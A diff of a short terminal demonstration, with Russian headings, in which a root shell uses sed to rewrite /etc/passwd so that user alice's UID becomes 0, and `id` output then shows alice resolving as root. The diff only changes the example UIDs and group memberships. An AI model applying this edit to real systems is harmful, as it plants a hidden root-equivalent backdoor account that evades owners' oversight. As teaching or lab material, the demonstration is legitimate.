@@ -1,17 +1,17 @@
 ===== Исходная учётная запись alice =====
 
 # grep '^alice' /etc/passwd
-alice:x:1001:1001::/home/alice:/bin/bash
+alice:x:1003:1003::/home/alice:/bin/bash
 
 # id alice
-uid=1001(alice) gid=1001(alice) groups=1001(alice)
+uid=1003(alice) gid=1003(alice) groups=1003(alice),4(adm),1010(project)
 
 ===== Подменяем третье поле (UID) на 0 =====
 
 # sed -i 's/^alice:x:[0-9]*:/alice:x:0:/' /etc/passwd
 
 # grep '^alice' /etc/passwd
-alice:x:0:1001::/home/alice:/bin/bash
+alice:x:0:1003::/home/alice:/bin/bash
 
 # id alice
-uid=0(root) gid=1001(alice) groups=1001(alice)
+uid=0(root) gid=1003(alice) groups=1003(alice),4(adm),1010(project)
